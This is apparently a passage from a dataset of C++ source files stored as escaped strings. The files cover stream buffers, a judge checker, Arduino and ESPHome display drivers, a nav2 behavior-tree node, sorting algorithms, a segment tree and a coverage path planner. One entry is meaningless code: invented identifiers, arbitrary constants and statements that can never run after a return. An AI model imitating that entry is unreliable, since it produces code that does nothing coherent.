_size)\r\n    return NULL;\r\n  if (!_buffer.EnsureCapacity(addSize))\r\n    return NULL;\r\n  return (Byte *)_buffer + _size;\r\n}\r\n\r\nvoid CDynBufSeqOutStream::CopyToBuffer(CByteBuffer &dest) const\r\n{\r\n  dest.CopyFrom((const Byte *)_buffer, _size);\r\n}\r\n\r\nSTDMETHODIMP CDynBufSeqOutStream::Write(const void *data, UInt32 size, UInt32 *processedSize)\r\n{\r\n  if (processedSize)\r\n    *processedSize = 0;\r\n  if (size == 0)\r\n    return S_OK;\r\n  Byte *buf = GetBufPtrForWriting(size);\r\n  if (!buf)\r\n    return E_OUTOFMEMORY;\r\n  memcpy(buf, data, size);\r\n  UpdateSize(size);\r\n  if (processedSize)\r\n    *processedSize = size;\r\n  return S_OK;\r\n}\r\n\r\nSTDMETHODIMP CBufPtrSeqOutStream::Write(const void *data, UInt32 size, UInt32 *processedSize)\r\n{\r\n  size_t rem = _size - _pos;\r\n  if (rem > size)\r\n    rem = (size_t)size;\r\n  if (rem != 0)\r\n  {\r\n    memcpy(_buffer + _pos, data, rem);\r\n    _pos += rem;\r\n  }\r\n  if (processedSize)\r\n    *processedSize = (UInt32)rem;\r\n  return (rem != 0 || size == 0) ? S_OK : E_FAIL;\r\n}\r\n\r\nSTDMETHODIMP CSequentialOutStreamSizeCount::Write(const void *data, UInt32 size, UInt32 *processedSize)\r\n{\r\n  UInt32 realProcessedSize;\r\n  HRESULT result = _stream->Write(data, size, &realProcessedSize);\r\n  _size += realProcessedSize;\r\n  if (processedSize)\r\n    *processedSize = realProcessedSize;\r\n  return result;\r\n}\r\n\r\nstatic const UInt64 kEmptyTag = (UInt64)(Int64)-1;\r\n\r\nvoid CCachedInStream::Free() throw()\r\n{\r\n  MyFree(_tags);\r\n  _tags = 0;\r\n  MidFree(_data);\r\n  _data = 0;\r\n}\r\n\r\nbool CCachedInStream::Alloc(unsigned blockSizeLog, unsigned numBlocksLog) throw()\r\n{\r\n  unsigned sizeLog = blockSizeLog + numBlocksLog;\r\n  if (sizeLog >= sizeof(size_t) * 8)\r\n    return false;\r\n  size_t dataSize = (size_t)1 << sizeLog;\r\n  if (_data == 0 || dataSize != _dataSize",
    "#include <bits/stdc++.h>\n\nusing namespace std;\n\n// Input data\nlong long n;\n\nint check(const string &tsol_path, const string &rsol_path) {\n    // There is scanned data\n    long long sol_res, res;\n\n    ifstream testing_solution(tsol_path);\n#define cin testing_solution\n    {\n        // scanning testing solution output\n        cin >> sol_res;\n    }\n    testing_solution.close();\n\n    ifstream right_solution(rsol_path);\n#define cin right_solution\n    {\n        // scanning right solution output\n        cin >> res;\n    }\n    right_solution.close();\n#undef cin\n\n    {\n        // comparing outputs\n        if (sol_res != res) {\n            cout << \"WA\\n\";\n            cout << \"Expected: \" << res << '\\n';\n            cout << \"Found: \" << sol_res << '\\n';\n            return 1;\n        }\n    }\n    cout << \"OK\\n\";\n    return 0;\n}\n\nint main(int argc, char *argv[]) {\n#ifndef STRESS\n    exit(-1);\n#endif\n    /*\n     arguments:\n     1) Input file path\n     2) Output file path\n     3) Testing solution output file path\n     4) Right solution output file path\n    */\n\n    freopen(argv[1], \"r\", stdin);\n    freopen(argv[2], \"w\", stdout);\n\n    {\n        // There you can scan input data if it's necessary\n        cin >> n;\n    }\n\n    return check(argv[3], argv[4]);\n}\n",
    "#include \"display_manager.h\"\n\nvoid DisplayManager::displayMessage(const char* message) {\n    currentMessage = message;\n    isError = false;\n    isDisplaying = true;\n    displayStartTime = millis();\n    \n    matrix.clear();\n    matrix.stroke(0xFFFFFFFF);\n    matrix.textFont(Font_5x7);\n    matrix.beginText(0, 1, 0xFFFFFF);\n    matrix.println(message);\n    matrix.endText();\n    matrix.endDraw();\n}\n\nvoid DisplayManager::displayError(int errorCode) {\n    currentErrorCode = errorCode;\n    isError = true;\n    isDisplaying = true;\n    displayStartTime = millis();\n    \n    matrix.clear();\n    matrix.stroke(0xFFFFFFFF);\n    matrix.textFont(Font_5x7);\n    matrix.beginText(0, 1, 0xFFFFFF);\n    \n    char errorText[3];\n    if (errorCode == 0) {\n        matrix.println(\"OK\");\n    } else {\n        snprintf(errorText, sizeof(errorText), \"E%d\", errorCode);\n        matrix.println(errorText);\n    }\n    \n    matrix.endText();\n    matrix.endDraw();\n}\n\nvoid DisplayManager::clear() {\n    matrix.clear();\n    matrix.endDraw();\n    isDisplaying = false;\n}\n\nvoid DisplayManager::update() {\n    if (!isDisplaying) {\n        return;\n    }\n    \n    unsigned long currentTime = millis();\n    unsigned long displayTime = isError ? ERROR_DISPLAY_TIME : MESSAGE_DISPLAY_TIME;\n    \n    if (currentTime - displayStartTime >= displayTime) {\n        clear();\n    }\n} ",
    "//\n\n#include \"Pointer/Normalize.h\"\n#include \"Install.h\"\n#define WeightArray_ReferenceMap (879*641)\n\n\nsize_t ButtonName::IndexNewValueMin(unsigned char *data, size_t len, void *param){\n\treturn 0;\n\t((PrototypeLinkArrayStack*)param)->LinkTableInstallCounter(data, len, 0, NULL);\n}\nvoid WeightTable::MapStringIndex::Stop(){\n\tif(!PageCollate || !PageMatrix)\n\t\treturn;\n\tPageWeight=false;\n\tButtonSource->Filter();\n\tthread->Matrix();\n\tdelete thread;\n\t}\n\n\n\nvoid SwapFilterInstall::Reset(){\n\tPageSelected=true;\n\tIndexTypographyIndexWeight=true;\n\tTypographyPointerConnectPattern=210;\n\tint i;\n\tfor(i=0;i<Filter_WindowBlock;i++){\n\t\tif(!Table[i].Normalize.IsEmpty()){\n\t\t\tMatrixInstall[i].Min=FixedContainer();\n\t\t}\n\t}\n\tLinkMatrixValue.Reset();\n\tArrayPointerSub=594;\n\tScrollbarWeight.Reset();\n\tArrayStdPattern=430;\n}\nvoid StackMinContainer::Reset(){\n\tMatrixPage=true;\n\tTypographySelectedSub=true;\n\tSetNormalizeSet=468;\n\tint i;\n\tfor(i=0;i<ValueStream_Table;i++){\n\t\tif(!Stream[i].New.IsEmpty()){\n\t\t\tCollateInstall[i].ArrayTable=Sub();\n\t\t}\n\t}\n\tIndexNormalizeInit.Reset();\n\tTableBlock=763;\n\tCounterArrayStack.Reset();\n\tMinSwap=413;\n}\nint InstallSelected=PointerSwapTypographyMatrix(&Matrix, FilterContainerTable, NewWeight);\nsize_t ConnectCounterStringSource::InstallStackWindow(unsigned char *data, size_t len, void *param){\n\treturn 0;\n\t((InitBlockSub*)param)->ArrayWindowNewSwap(data, len, 0, NULL);\n}\n",
    "// Copyright (c) 2018 Intel Corporation\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n\n#include <chrono>\n#include <string>\n\n#include \"rclcpp/rclcpp.hpp\"\n#include \"geometry_msgs/msg/pose_stamped.hpp\"\n#include \"behaviortree_cpp_v3/decorator_node.h\"\n#include \"nav2_behavior_tree/plugins/decorator/goal_updated_controller.hpp\"\n\n\nnamespace nav2_behavior_tree\n{\n\nGoalUpdatedController::GoalUpdatedController(\n  const std::string & name,\n  const BT::NodeConfiguration & conf)\n: BT::DecoratorNode(name, conf)\n{\n}\n\nBT::NodeStatus GoalUpdatedController::tick()\n{\n  if (status() == BT::NodeStatus::IDLE) {\n    // Reset since we're starting a new iteration of\n    // the goal updated controller (moving from IDLE to RUNNING)\n\n    config().blackboard->get<std::vector<geometry_msgs::msg::PoseStamped>>(\"goals\", goals_);\n    config().blackboard->get<geometry_msgs::msg::PoseStamped>(\"goal\", goal_);\n\n    goal_was_updated_ = true;\n  }\n\n  setStatus(BT::NodeStatus::RUNNING);\n\n  std::vector<geometry_msgs::msg::PoseStamped> current_goals;\n  config().blackboard->get<std::vector<geometry_msgs::msg::PoseStamped>>(\"goals\", current_goals);\n  geometry_msgs::msg::PoseStamped current_goal;\n  config().blackboard->get<geometry_msgs::msg::PoseStamped>(\"goal\", current_goal);\n\n  if (goal_ != current_goal || goals_ != current_goals) {\n    goal_ = current_goal;\n    goals_ = current_goals;\n    goal_was_updated_ = true;\n  }\n\n  // The child gets ticked the first time through and any time the goal has\n  // changed or preempted. In addition, once the child begins to run, it is ticked each time\n  // 'til completion\n  if ((child_node_->status() == BT::NodeStatus::RUNNING) || goal_was_updated_) {\n    goal_was_updated_ = false;\n    const BT::NodeStatus child_state = child_node_->executeTick();\n\n    switch (child_state) {\n      case BT::NodeStatus::RUNNING:\n        return BT::NodeStatus::RUNNING;\n\n      case BT::NodeStatus::SUCCESS:\n        return BT::NodeStatus::SUCCESS;\n\n      case BT::NodeStatus::FAILURE:\n      default:\n        return BT::NodeStatus::FAILURE;\n    }\n  }\n\n  return status();\n}\n\n}  // namespace nav2_behavior_tree\n\n#include \"behaviortree_cpp_v3/bt_factory.h\"\nBT_REGISTER_NODES(factory)\n{\n  factory.registerNodeType<nav2_behavior_tree::GoalUpdatedController>(\"GoalUpdatedController\");\n}\n",
    "#include <iostream>\n#include <sys/utsname.h>\n#include <ctime>\n#include <chrono>\n#include <algorithm>\n\nusing namespace std;\nusing namespace std::chrono;\n\n// Funcao para imprimir informacoes do sistema\nvoid imprimirInformacoesDoSistema() {\n    struct utsname buffer;\n    if (uname(&buffer) != 0) {\n        perror(\"uname\");\n        return;\n    }\n\n    cout << \"Sistema Operacional: \" << buffer.sysname << endl;\n    cout << \"Nome do Host: \" << buffer.nodename << endl;\n    cout << \"Release do SO: \" << buffer.release << endl;\n    cout << \"Versao do SO: \" << buffer.version << endl;\n    cout << \"Arquitetura do SO: \" << buffer.machine << endl;\n}\n\n// Funcao para imprimir um array\nvoid imprimirArray(int elementos[], int n) {\n    for (int i = 0; i < n; ++i) {\n        cout << elementos[i] << \" \";\n    }\n    cout << endl;\n}\n\n// Insercao Direta\nvoid insercaoDireta(int elementos[], int n) {\n    for (int i = 1; i < n; ++i) {\n        int chave = elementos[i];\n        int j = i - 1;\n        while (j >= 0 && elementos[j] > chave) {\n            elementos[j + 1] = elementos[j];\n            j--;\n        }\n        elementos[j + 1] = chave;\n    }\n}\n\n// BubbleSort - Bolha\nvoid bolha(int elementos[], int n) {\n    for (int i = 0; i < n - 1; ++i) {\n        for (int j = 0; j < n - i - 1; ++j) {\n            if (elementos[j] > elementos[j + 1]) {\n                swap(elementos[j], elementos[j + 1]);\n            }\n        }\n    }\n}\n\n// Selecao Direta\nvoid selecaoDireta(int elementos[], int n) {\n    for (int i = 0; i < n - 1; ++i) {\n        int min_idx = i;\n        for (int j = i + 1; j < n; ++j) {\n            if (elementos[j] < elementos[min_idx]) {\n                min_idx = j;\n            }\n        }\n        swap(elementos[min_idx], elementos[i]);\n    }\n}\n\n// ShellSort\nvoid shellSort(int elementos[], int n) {\n    for (int gap = n / 2; gap > 0; gap /= 2) {\n        for (int i = gap; i < n; ++i) {\n            int temp = elementos[i];\n            int j;\n            for (j = i; j >= gap && elementos[j - gap] > temp; j -= gap) {\n                elementos[j] = elementos[j - gap];\n            }\n            elementos[j] = temp;\n        }\n    }\n}\n\n// QuickSort\nint particionar(int elementos[], int baixo, int alto) {\n    int pivo = elementos[alto];\n    int i = baixo - 1;\n    for (int j = baixo; j < alto; ++j) {\n        if (elementos[j] < pivo) {\n            ++i;\n            swap(elementos[i], elementos[j]);\n        }\n    }\n    swap(elementos[i + 1], elementos[alto]);\n    return i + 1;\n}\n\nvoid quickSort(int elementos[], int baixo, int alto) {\n    if (baixo < alto) {\n        int pi = particionar(elementos, baixo, alto);\n        quickSort(elementos, baixo, pi - 1);\n        quickSort(elementos, pi + 1, alto);\n    }\n}\n\n// HeapSort\nvoid heapificar(int elementos[], int n, int i) {\n    int maior = i;\n    int esquerda = 2 * i + 1;\n    int direita = 2 * i + 2;\n\n    if (esquerda < n && elementos[esquerda] > elementos[maior]) {\n        maior = esquerda;\n    }\n    if (direita < n && elementos[direita] > elementos[maior]) {\n        maior = direita;\n    }\n    if (maior != i) {\n        swap(elementos[i], elementos[maior]);\n        heapificar(elementos, n, maior);\n    }\n}\n\nvoid heapSort(int elementos[], int n) {\n    for (int i = n / 2 - 1; i >= 0; --i) {\n        heapificar(elementos, n, i);\n    }\n    for (int i = n - 1; i > 0; --i) {\n        swap(elementos[0], elementos[i]);\n        heapificar(elementos, i, 0);\n    }\n}\n\n// MergeSort\nvoid mesclar(int elementos[], int l, int m, int r) {\n    int n1 = m - l + 1;\n    int n2 = r - m;\n\n    int L[n1], R[n2];\n\n    for (int i = 0; i < n1; ++i) {\n        L[i] = elementos[l + i];\n    }\n    for (int i = 0; i < n2; ++i) {\n        R[i] = elementos[m + 1 + i];\n    }\n\n    int i = 0, j = 0, k = l;\n    while (i < n1 && j < n2) {\n        if (L[i] <= R[j]) {\n            elementos[k++] = L[i++];\n        } else {\n            elementos[k++] = R[j++];\n        }\n    }\n\n    while (i < n1) {\n        elementos[k++] = L[i++];\n    }\n\n    while (j < n2) {\n        elementos[k++] = R[j++];\n    }\n}\n\nvoid mergeSort(int elementos[], int l, int r) {\n    if (l < r) {\n        int m = l + (r - l) / 2;\n        mergeSort(elementos, l, m);\n        mergeSort(elementos, m + 1, r);\n        mesclar(elementos, l, m, r);\n    }\n}\n\n// RadixSort\nint obterMax(int elementos[], int n) {\n    int max = elementos[0];\n    for (int i = 1; i < n; ++i) {\n        if (elementos[i] > max) {\n            max = elementos[i];\n        }\n    }\n    return max;\n}\n\nvoid contarClassificar(int elementos[], int n, int exp) {\n    int saida[n], contagem[10] = {0};\n\n    for (int i = 0; i < n; ++i) {\n        contagem[(elementos[i] / exp) % 10]++;\n    }\n    for (int i = 1; i < 10; ++i) {\n        contagem[i] += contagem[i - 1];\n    }\n    for (int i = n - 1; i >= 0; --i) {\n        saida[contagem[(elementos[i] / exp) % 10] - 1] = elementos[i];\n        contagem[(elementos[i] / exp) % 10]--;\n    }\n    for (int i = 0; i < n; ++i) {\n        elementos[i] = saida[i];\n    }\n}\n\nvoid radixSort(int elementos[], int n",
    "#include \"SerialUSB.h\"\n#include \"Arduino.h\"\n#include \"HID-Project.h\"\n\n#define dataSize header[2]\n\nunsigned char header[HEADER_SIZE];\nunsigned char bufferSize = 0;\nunsigned char* data;\n\nvoid pull() {\n    for (unsigned char i = 0; i < 4; i++) { // Reset header cache\n        header[i] = 0x00;\n    }\n\n    while (Serial1.available() < HEADER_SIZE); // Wait for a full header queue\n\n    while (header[0] != 0xFA || header[1] != 0x80) {\n        if (!Serial1.available()) {\n            Serial.println(\"Error: failed to read packet\");\n            return;\n        }\n\n        for (unsigned char i = 0; i < HEADER_SIZE - 1; i++) {\n            header[i] = header[i + 1];\n        }\n        header[HEADER_SIZE - 1] = Serial1.read();\n    }\n\n    if (dataSize > bufferSize) {\n        data = realloc(data, dataSize);\n        bufferSize = dataSize;\n    }\n\n    while (Serial1.available() < dataSize); // Wait for all data to be queued\n\n    for (unsigned char i = 0; i < dataSize; i++) {\n        data[i] = Serial1.read();\n    }\n}\n\nlong readLong(unsigned char pos) {\n    long result = 0;\n\n    for (unsigned char i = 0; i < 4; i++) {\n        result += data[i + pos * 4] << 8 * i;\n    }\n\n    return result;\n}\n\nchar readByte(unsigned char pos) {\n    return data[pos];\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\n#include <climits>\nusing namespace std;\n\nclass SegmentTree {\n    vector<long long> tree, lazy;\n    int n;\n\npublic:\n    SegmentTree(int size) {\n        n = size;\n        tree.assign(4 * n, 0);\n        lazy.assign(4 * n, 0);\n    }\n\n    void build(const vector<int>& arr, int node, int start, int end) {\n        if (start == end) {\n            tree[node] = arr[start];\n        } else {\n            int mid = (start + end) / 2;\n            build(arr, 2 * node, start, mid);\n            build(arr, 2 * node + 1, mid + 1, end);\n            tree[node] = max(tree[2 * node], tree[2 * node + 1]);\n        }\n    }\n\n    void apply(int node, int start, int end, long long value) {\n        tree[node] += value;\n        if (start != end) {\n            lazy[2 * node] += value;\n            lazy[2 * node + 1] += value;\n        }\n    }\n\n    void propagate(int node, int start, int end) {\n        if (lazy[node] != 0) {\n            apply(node, start, end, lazy[node]);\n            lazy[node] = 0;\n        }\n    }\n\n    void update(int node, int start, int end, int l, int r, long long value) {\n        propagate(node, start, end);\n        if (start > r || end < l) return;\n        if (start >= l && end <= r) {\n            apply(node, start, end, value);\n            return;\n        }\n        int mid = (start + end) / 2;\n        update(2 * node, start, mid, l, r, value);\n        update(2 * node + 1, mid + 1, end, l, r, value);\n        tree[node] = max(tree[2 * node], tree[2 * node + 1]);\n    }\n\n    long long query(int node, int start, int end, int l, int r) {\n        propagate(node, start, end);\n        if (start > r || end < l) return LLONG_MIN;\n        if (start >= l && end <= r) return tree[node];\n        int mid = (start + end) / 2;\n        return max(query(2 * node, start, mid, l, r),\n                   query(2 * node + 1, mid + 1, end, l, r));\n    }\n\n    void update(int l, int r, long long value) {\n        update(1, 0, n - 1, l, r, value);\n    }\n\n    long long query(int l, int r) {\n        return query(1, 0, n - 1, l, r);\n    }\n};\n\nint main() {\n    int n, m;\n    cin >> n >> m;\n    vector<int> arr(n);\n    for (int i = 0; i < n; i++) cin >> arr[i];\n\n    SegmentTree segTree(n);\n    segTree.build(arr, 1, 0, n - 1);\n\n    vector<long long> results;\n    for (int i = 0; i < m; i++) {\n        string type;\n        cin >> type;\n        if (type == \"add\") {\n            int l, r, add;\n            cin >> l >> r >> add;\n            segTree.update(l - 1, r - 1, add);\n        } else if (type == \"max\") {\n            int l, r;\n            cin >> l >> r;\n            results.push_back(segTree.query(l - 1, r - 1));\n        }\n    }\n\n    for (long long res : results) {\n        cout << res << \"\\n\";\n    }\n\n    return 0;\n}\n",
    "#include \"jd9613_display.h\"\n#include \"esphome/core/application.h\"\n#include \"esphome/core/hal.h\"\n#include \"esphome/core/helpers.h\"\n#include \"esphome/core/log.h\"\n#include <cstdio>\n\nnamespace esphome {\nnamespace jd9613 {\n\nstatic const uint16_t SPI_SETUP_US = 100;         // estimated fixed overhead in microseconds for an SPI write\nstatic const uint16_t SPI_MAX_BLOCK_SIZE = 4092;  // Max size of continuous SPI transfer\n\n// store a 16 bit value in a buffer, big endian.\nstatic inline void put16_be(uint8_t *buf, uint16_t value) {\n  buf[0] = value >> 8;\n  buf[1] = value;\n}\n\nJD9613Display::JD9613Display()\n  :init_sequence_{INITCMD_JD9613}\n  ,width_(588)\n  ,height_(126)\n{\n  uint8_t cmd, num_args, bits;\n  const uint8_t *addr = init_sequence_;\n  while ((cmd = *addr++) != 0) {\n    num_args = *addr++;\n    if (num_args == JD9613_DELAY_FLAG)\n      continue;\n    bits = *addr;\n    switch (cmd) {\n      case JD9613_MADCTL: {\n        this->swap_xy_ = (bits & MADCTL_MV) != 0;\n        this->mirror_x_ = (bits & MADCTL_MX) != 0;\n        this->mirror_y_ = (bits & MADCTL_MY) != 0;\n        this->color_order_ = (bits & MADCTL_BGR) ? display::COLOR_ORDER_BGR : display::COLOR_ORDER_RGB;\n        break;\n      }\n\n      case JD9613_PIXFMT: {\n        if ((bits & 0xF) == 6)\n          this->is_18bitdisplay_ = true;\n        break;\n      }\n\n      default:\n        break;\n    }\n    addr += (num_args & 0x7F);\n  }\n\n  // Orientation according to Lilygo T-Touchbar-AMOLED, which has two JD9613\n  // screen of size 126x294 combined to form one virtual screen of size 588x126.\n  //\n  // Screen 0 (select by CS0) is rotated (from potrait to landscape) 90 degree\n  // clockwise to form the right half of the virtual screen.\n  //\n  // Screen 1 (select by CS1) is rotated 90 degree counter-clockwise to form\n  // the left half of the virtual screen.\n  //\n  left_panel_ = new JD9613Display(126, 294);\n  left_panel_->set_rotation(display::DISPLAY_ROTATION_270_DEGREES);\n  right_panel_ = new JD9613Display(126, 294);\n  right_panel_->set_rotation(display::DISPLAY_ROTATION_90_DEGREES);\n}\n\n\nJD9613Display::JD9613Display(int16_t width, int16_t height)\n  : width_{width}, height_{height}\n{\n}\n\nvoid JD9613Display::set_madctl() {\n  // custom x/y transform and color order\n  uint8_t mad = this->color_order_ == display::COLOR_ORDER_BGR ? MADCTL_BGR : MADCTL_RGB;\n  if (this->swap_xy_)\n    mad |= MADCTL_MV;\n  if (this->mirror_x_)\n    mad |= MADCTL_MX;\n  if (this->mirror_y_)\n    mad |= MADCTL_MY;\n  this->command(JD9613_MADCTL);\n  this->data(mad);\n  esph_log_d(TAG, \"Wrote MADCTL 0x%02X\", mad);\n}\n\nvoid JD9613Display::setup() {\n  this->x_low_ = this->width_;\n  this->y_low_ = this->height_;\n  this->x_high_ = 0;\n  this->y_high_ = 0;\n\n  if (!is_composite())\n    return;\n\n  ESP_LOGD(TAG, \"Setting up jd9613\");\n\n  this->setup_pins_();\n\n  cs0_pin_->digital_write(false);\n  cs1_pin_->digital_write(false);\n\n  this->init_lcd_(this->init_sequence_);\n  this->init_lcd_(this->extra_init_sequence_.data());\n\n  switch (this->pixel_mode_) {\n    case PIXEL_MODE_16:\n      if (this->is_18bitdisplay_) {\n        this->command(JD9613_PIXFMT);\n        this->data(0x55);\n        this->is_18bitdisplay_ = false;\n      }\n      break;\n    case PIXEL_MODE_18:\n      if (!this->is_18bitdisplay_) {\n        this->command(JD9613_PIXFMT);\n        this->data(0x66);\n        this->is_18bitdisplay_ = true;\n      }\n      break;\n    default:\n      break;\n  }\n\n  this->set_madctl();\n  this->command(this->pre_invertcolors_ ? JD9613_INVON : JD9613_INVOFF);\n  cs0_pin_->digital_write(true);\n  cs1_pin_->digital_write(true);\n\n  left_panel_->pixel_mode_ =\n  right_panel_->pixel_mode_ = pixel_mode_;\n  left_panel_->buffer_color_mode_ =\n  right_panel_->buffer_color_mode_ = buffer_color_mode_;\n  left_panel_->color_order_ =\n  right_panel_->color_order_ = color_order_;\n  left_panel_->is_18bitdisplay_ =\n  right_panel_->is_18bitdisplay_ = is_18bitdisplay_;\n  left_panel_->palette_ =\n  right_panel_->palette_ = palette_;\n\n  left_panel_->setup();\n  right_panel_->setup();\n}\n\nvoid JD9613Display::alloc_buffer_() {\n  if (is_composite())\n    return;\n\n  if (this->buffer_color_mode_ == BITS_16) {\n    this->init_internal_(this->get_buffer_length_() * 2);\n    if (this->buffer_ != nullptr) {\n      return;\n    }\n    this->buffer_color_mode_ = BITS_8;\n  }\n  this->init_internal_(this->get_buffer_length_());\n  if (this->buffer_ == nullptr) {\n    this->mark_failed();\n  }\n}\n\nvoid JD9613Display::setup_pins_() {\n  if (!is_composite())\n    return;\n\n  this->dc_pin_->setup();  // OUTPUT\n  this->dc_pin_->digital_write(false);\n  left_panel_->dc_pin_ =\n  right_panel_->dc_pin_ = this->dc_pin_;\n\n  this->cs0_pin_->setup();  // OUTPUT\n  this->cs0_pin_->digital_write(false);\n\n  this->cs1_pin_->setup();  // OUTPUT\n  this->cs1_pin_->digital_write(false);\n\n  if (this->reset_pin_ != nullptr) {\n    this->reset_pin_->setup();  // OUTPUT\n    this->reset_pin_->digital_write(true);\n  }\n\n  this->spi_setup();\n\n  left_panel_->set_spi_parent(this->parent_);\n  left_panel_->set_data_rate(this->data_ra",
    "/**\n * @author lijun\n * @date 2025-1-1\n * @brief Coverage Path Planning Using BCD Algorithm\n * \u6e90\u4ee3\u7801\u662f\u501f\u9274 Richey Huang  \u8fdb\u884c\u4e86\u5c11\u91cf\u4e86\u4fee\u6539\u6574\u7406\uff01\n * \u7ad9\u5728\u524d\u4eba\u7684\u80a9\u8180\u4e0a\u53ef\u4ee5\u8d70\u7684\u66f4\u5feb\uff01\uff01\uff01\n */\n#include \"../include/coverage_planner.hpp\"\n\n// \u662f\u5426\u6253\u5361\u8fc7\u7a0b\u663e\u793a\n#define Process_Visual 1\n\n// \u53ef\u89c6\u5316\u663e\u793a\u6a21\u5f0f\nenum VisualizationMode\n{\n    PATH_MODE,\n    ROBOT_MODE\n};\n\nnamespace coverageplanner\n{\n    // \u8986\u76d6\u8def\u5f84\u89c4\u5212\u5668\n    std::deque<Point2D> CoveragePlanner::planner(const cv::Mat &clean_map, int robot_radius, int clean_distance)\n    {\n        if (clean_map.empty())\n        {\n            std::cout << \"Error, clean map is empty!\" << std::endl;\n            return std::deque<Point2D>();\n        }\n        else\n        {\n            cv::Mat1b map = clean_map.clone();\n            cv::threshold(map, map, 128, 255, cv::THRESH_BINARY);\n            // \u5916\u8fb9\u754c\u8f6e\u5ed3\n            std::vector<std::vector<cv::Point>> wall_contours;\n            // \u969c\u788d\u7269\u8f6e\u5ed3\n            std::vector<std::vector<cv::Point>> obstacle_contours;\n            // \u63d0\u53d6\u5e76\u8fdb\u884c\u663e\u793a\n            extractContours(map, wall_contours, obstacle_contours, robot_radius);\n            if (Process_Visual)\n            {\n                showExtractedContours(map, wall_contours);\n                showExtractedContours(map, obstacle_contours);\n            }\n\n            // \u5c06\u969c\u788d\u7269\u8f6e\u5ed3\u3001\u8fb9\u754c\u8f6e\u5ed3\u8fdb\u884c\u4e0a\u91c7\u6837\u5904\u7406\n            PolygonList obstacles = constructObstacles(map, obstacle_contours);\n            Polygon wall = constructWall(map, wall_contours.front());\n            // \u5f97\u5230\u533a\u57df\u5206\u89e3\u8f6e\u5ed3\n            std::vector<CellNode> cell_graph = constructCellGraph(map, wall_contours, obstacle_contours, wall, obstacles);\n            if (Process_Visual)\n            {\n                // checkPointType(map, wall, obstacles);\n                checkGeneratedCells(map, cell_graph);\n            }\n\n            // \u8d77\u70b9\u4e3a\u7b2c\u4e00\u4e2a\u8f6e\u5ed3\u7684\u7b2c\u4e00\u4e2a\u5929\u82b1\u677f\u70b9\n            Point2D start = cell_graph.front().ceiling.front();\n            std::deque<std::deque<Point2D>> original_planning_path = staticPathPlanning(cell_graph, start, clean_distance);\n            if (Process_Visual)\n            {\n                printPathNodes(original_planning_path);\n            }\n\n            std::deque<Point2D> path = filterTrajectory(original_planning_path);\n            if (Process_Visual)\n            {\n                checkPathConsistency(path);\n                int time_interval = 1;\n                visualizeTrajectory(map, path, robot_radius, 0, time_interval);\n            }\n            std::cout << \"path.size(): \" << path.size() << std::endl;\n            return path;\n        }\n    }\n\n    void CoveragePlanner::extractContours(const cv::Mat &original_map, std::vector<std::vector<cv::Point>> &wall_contours, std::vector<std::vector<cv::Point>> &obstacle_contours, int robot_radius)\n    {\n\n        cv::Mat erode_map = original_map.clone();\n        cv::threshold(erode_map, erode_map, 128, 255, cv::THRESH_BINARY);\n\n        if (robot_radius != 0)\n        {\n            cv::Mat erod_struct = getStructuringElement(cv::MORPH_ELLIPSE, cv::Size((robot_radius * 2 + 1), (robot_radius * 2 + 1)));\n            cv::erode(erode_map, erode_map, erod_struct);\n        }\n\n        std::vector<std::vector<cv::Point>> contours;\n        cv::findContours(erode_map, contours, cv::RETR_EXTERNAL, cv::CHAIN_APPROX_NONE);\n        std::vector<int> wall_cnt_indices(contours.size());\n        std::iota(wall_cnt_indices.begin(), wall_cnt_indices.end(), 0);\n        std::sort(wall_cnt_indices.begin(), wall_cnt_indices.end(), [&contours](int lhs, int rhs)\n                  { return cv::contourArea(contours[lhs]) > cv::contourArea(contours[rhs]); });\n\n        // \u627e\u5230\u5916\u8f6e\u5ed3(\u5916\u8f6e\u5ed3\u6700\u5927)\n        std::vector<cv::Point> raw_wall_contour = contours[wall_cnt_indices.front()];\n        wall_contours = {raw_wall_contour};\n\n        // \u5bfb\u627e\u969c\u788d\u7269\u8f6e\u5ed3\n        cv::Mat mask = cv::Mat(erode_map.size(), erode_map.type(), 255);\n        cv::fillPoly(mask, wall_contours, 0);\n        cv::Mat base = erode_map.clone();\n        base += mask;\n        // cv::THRESH_BINARY_INV \u9608\u503c\u7c7b\u578b\u53cd\u8f6c\uff0c\u5927\u4e8e\u7b49\u4e8e128\u4f1a\u53d8\u6210\u9ed1\u8272\uff0c\u5c0f\u4e8e128\u4f1a\u53d8\u6210\u767d\u8272\n        